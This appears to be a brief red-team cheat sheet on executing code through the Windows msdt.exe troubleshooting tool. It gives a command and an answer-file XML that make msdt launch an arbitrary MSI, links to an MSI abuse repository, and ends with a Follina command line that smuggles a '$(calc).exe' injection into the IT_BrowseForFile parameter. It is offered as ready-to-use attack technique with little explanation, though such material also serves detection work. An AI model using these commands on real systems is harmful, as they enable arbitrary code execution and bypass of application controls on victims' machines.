

## MSI Execution using msdt.exe
Reference:  https://lolbas-project.github.io/lolbas/Binaries/Msdt/

> https://gist.github.com/homjxi0e/3f35212db81b9375b7906031a40c6d87

## Method 1:
- Commad to execute is 

> msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE 

- save to PCW8E57.xml 

```
<?xml version="1.0" encoding="utf-16"?>
<Answers Version="1.0">
	<Interaction ID="IT_LaunchMethod">
		<Value>ContextMenu</Value>
	</Interaction>
	<Interaction ID="IT_SelectProgram">
		<Value>NotListed</Value>
	</Interaction>
	<Interaction ID="IT_BrowseForFile">
		<Value>C:\Windows\assembly\Exec-Execute.msi</Value>
	</Interaction>
</Answers>
```

## Method 2:

> https://github.com/mgeeky/msi-shenanigans

https://github.com/mgeeky/msi-shenanigans/blob/main/1-exe/test-msi.bat
https://github.com/mgeeky/msi-shenanigans/blob/main/1-exe/sample1-run-autoruns64.msi


## Follina using cmdline

- msdt /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"

